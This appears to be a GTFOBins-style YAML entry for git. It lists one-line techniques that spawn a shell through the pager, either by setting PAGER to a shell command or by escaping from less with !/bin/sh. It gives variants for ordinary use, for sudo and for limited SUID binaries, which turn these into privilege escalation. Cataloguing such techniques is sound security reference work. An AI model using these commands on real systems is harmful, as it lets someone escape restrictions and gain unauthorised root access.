---
functions:
  shell:
    - code: PAGER='sh -c "exec sh 0<&1"' git -p help
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        git help config
        !/bin/sh
  sudo:
    - code: PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo git -p help config
        !/bin/sh
  limited-suid:
    - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
---
